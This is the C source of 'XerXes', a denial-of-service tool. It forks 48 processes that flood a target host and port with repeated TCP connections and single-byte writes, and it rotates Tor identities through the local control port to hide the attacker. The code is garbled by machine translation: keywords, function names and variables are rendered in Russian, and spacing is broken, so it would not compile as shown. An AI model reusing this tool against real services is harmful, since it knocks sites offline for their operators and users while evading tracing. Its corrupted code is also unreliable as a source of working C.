/ * XerXes - самый мощный инструмент для работы с досами - THN (http://www.thehackernews.com) * 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys / socket.h>
#include <sys / types.h>
#include <netinet / in.h>
#include <arpa / inet.h>

int make_socket (char * host, char * port) {
	struct addrinfo hints, * servinfo, * p;
	int sock, r;
// fprintf (stderr, "[Соединение ->% s:% s \ n", хост, порт);
	memset (& hints, 0, sizeof (hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if ((r = getaddrinfo (хост, порт, & hints, & servinfo))! = 0) {
		fprintf (stderr, "getaddrinfo:% s \ n", gai_strerror (r));
		Выход (0);
	}
	for (p = servinfo; p! = NULL; p = p-> ai_next) {
		if ((sock = socket (p-> ai_family, p-> ai_socktype, p-> ai_protocol)) == -1) {
			Продолжить;
		}
		if (connect (sock, p-> ai_addr, p-> ai_addrlen) == - 1) {
			закрыть (носок);
			Продолжить;
		}
		перерыв;
	}
	if (p == NULL) {
		если (ServInfo)
			freeaddrinfo (ServInfo);
		fprintf (stderr, "Соединение не может быть установлено \ n");
		Выход (0);
	}
	если (ServInfo)
		freeaddrinfo (ServInfo);
	fprintf (stderr, "[Connected ->% s:% s] \ n", хост, порт);
	возвратный носок;
}

void сломался (int s) {
	// ничего не делать
}

#define СОЕДИНЕНИЯ 8
#define THREADS 48

void attack (char * host, char * port, int id) {
	int сокеты [СОЕДИНЕНИЯ];
	int x, g = 1, r;
	для (x = 0; x! = СОЕДИНЕНИЯ; x ++)
		розетки [х] = 0;
	сигнал (SIGPIPE & сломался);
	while (1) {
		для (x = 0; x! = СОЕДИНЕНИЯ; x ++) {
			if (сокеты [x] == 0)
				сокеты [x] = make_socket (хост, порт);
			r = write (сокеты [x], "\ 0", 1);
			if (r == -1) {
				близкие (розетки [х]);
				сокеты [x] = make_socket (хост, порт);
			} еще
// fprintf (stderr, "Сокет [% i ->% i] ->% i \ n", x, сокеты [x], r);
			fprintf (stderr, "[% i: Voly Sent] \ n", id);
		}
		fprintf (stderr, "[% i: Voly Sent] \ n", id);
		USleep (300000);
	}
}

void cycle_identity () {
	int r;
	int socket = make_socket ("localhost", "9050");
	запись (сокет, "AUTHENTICATE \" \ "\ n", 16);
	while (1) {
		r = запись (сокет, «сигнал NEWNYM \ n \ x00», 16);
		fprintf (stderr, "[% i: cycle_identity -> signal NEWNYM \ n", r);
		USleep (300000);
	}
}

int main (int argc, char ** argv) {
	int x;
	if (argc! = 3)
		cycle_identity ();
	для (x = 0; x! = THREADS; x ++) {
		если (вилка ())
			атака (argv [1], argv [2], x);
		USleep (200000);
	}
	ЕОКП (STDIN);
	вернуть 0;
}
